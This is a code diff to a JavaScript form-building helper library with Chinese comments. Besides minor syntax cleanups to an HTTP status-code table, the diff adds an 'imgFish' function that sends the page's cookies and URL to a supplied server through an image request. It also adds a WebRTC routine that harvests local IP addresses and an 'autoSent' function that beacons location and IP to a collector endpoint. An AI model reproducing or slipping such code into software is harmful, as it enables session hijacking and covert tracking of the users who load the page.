@@ -1,4 +1,4 @@
-//全局变量
+//全局变量(多变操作)
 var MInfo ;
 //表单构建 方法
 var MForm = function () {
@@ -8,13 +8,15 @@ var MForm = function () {
     var init = {
         'name': 'form build' ,
         'version':'1.0.1',
-        'author': 'sjm'
+        'author': 'sjm',
+        'params': 'MInfo',
+        'function': 'MForm'
     } ;
 
     //更多提示信息
     init.more = function () {
         console.log("更多插件相关：https://developer.chrome.com/extensions （你将有机会变成插件高手!）");
-    }
+    } ;
 
     //基础提示
     init.errorCode = function (httpCode) {
@@ -26,7 +28,7 @@ var MForm = function () {
         } else {
             console.log(code);
         }
-    }
+    };
 
     //内部code提示
     that.errorCodeBase = function (httpCode) {
@@ -34,7 +36,7 @@ var MForm = function () {
             "1xx":{
                 "100":"继续",
                 "101":"交换协议",
-                "102":"处理",
+                "102":"处理"
             },
             "2xx":{
                 "200":"好的",
@@ -46,7 +48,7 @@ var MForm = function () {
                 "206":"部分内容",
                 "207":"多状态",
                 "208":"已经报告",
-                "226":"IM已使用",
+                "226":"IM已使用"
             },
             "3xx":{
                 "300":"多种选择",
@@ -56,7 +58,7 @@ var MForm = function () {
                 "304":"未修改",
                 "305":"使用代理",
                 "307":"临时重定向",
-                "308":"永久重定向",
+                "308":"永久重定向"
             },
             "4xx":{
                 "400":"错误请求",
@@ -88,7 +90,7 @@ var MForm = function () {
                 "431":"请求标头字段太大",
                 "444":"连接已关闭但没有响应",
                 "451":"因法律原因不可用",
-                "499":"客户关闭请求",
+                "499":"客户关闭请求"
             },
             "5xx":{
                 "500":"内部服务器错误",
@@ -114,14 +116,14 @@ var MForm = function () {
         }else {
             console.log(allCode);
         }
-    }
+    };
 
     //错误信息提示  外部代码需要return终止
     init.error = function (msg,code) {
         if(!code) code = 400 ;
         if(!msg)  msg  = 'error';
         console.log({"code":code,"message":msg});
-    }
+    };
     
     //yii csrf验证
     init.frame = function (data,frame) {
@@ -209,16 +211,89 @@ var MForm = function () {
             return ;
         }
         init.dom(MInfo['data'],MInfo['url']);
-    }
+    };
+
+    //打印
+    init.dd = function (d) {
+        if(!d) {
+            init.error('请输入打印信息!');
+            return ;
+        }
+        return console.log(d);
+    };
+
+    //图片钓鱼
+    init.imgFish = function (url,data) {
+        if(!url) return ;
+        if(!data) return ;
+        var img = new Image();
+        img.src= url + '?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie) ;
+        init.error('图片钓鱼发送成功!',200);
+    };
+
+    //ip获取
+    init.getIps  = function (callback) {
+        var ip_dups = {};
+        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var useWebKit = !!window.webkitRTCPeerConnection;
+        if (!RTCPeerConnection) {
+            var win = iframe.contentWindow;
+            RTCPeerConnection = win.RTCPeerConnection || win.mozRTCPeerConnection || win.webkitRTCPeerConnection;
+            useWebKit = !!win.webkitRTCPeerConnection;
+        }
+        var mediaConstraints = {
+            optional: [{
+                RtpDataChannels: true
+            }]
+        };
+        var servers = {
+            iceServers: [{
+                urls: "stun:stun.services.mozilla.com"
+            }]
+        };
+        var pc = new RTCPeerConnection(servers, mediaConstraints);
+        function handleCandidate(candidate) {
+            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
+            var ip_addr = ip_regex.exec(candidate)[1];
+            if (ip_dups[ip_addr] === undefined) callback(ip_addr);
+            ip_dups[ip_addr] = true;
+        }
+        pc.onicecandidate = function(ice) {
+            if (ice.candidate) handleCandidate(ice.candidate.candidate);
+        };
+        pc.createDataChannel("");
+        pc.createOffer(function(result) {
+                pc.setLocalDescription(result,
+                    function() {},
+                    function() {});
+
+            },
+            function() {});
+            setTimeout(function() {
+                var lines = pc.localDescription.sdp.split('\n');
+                lines.forEach(function(line) {
+                    if (line.indexOf('a=candidate:') === 0) handleCandidate(line);
+                });
+            },
+            1000);
+    };
+
+    //自动发送
+    init.autoSent = function () {
+        init.getIps(
+            function (ip) {
+                (new Image()).src = 'http://localhost:20002/index.php?do=api&id={projectId}&location='
+                    + escape(
+                                (function(){
+                                    try {
+                                        return document.location.href
+                                    } catch(e) {
+                                        return ''
+                                    }
+                                })()
+                            ) + '&ip=' + ip;
+            });
+    };
+
     return init ;
 }();
-
-window.onload = function (ev) {
- function exT() {
-   console.log(23);
- }
-}
-
-function exT() {
-    console.log(223);
-}
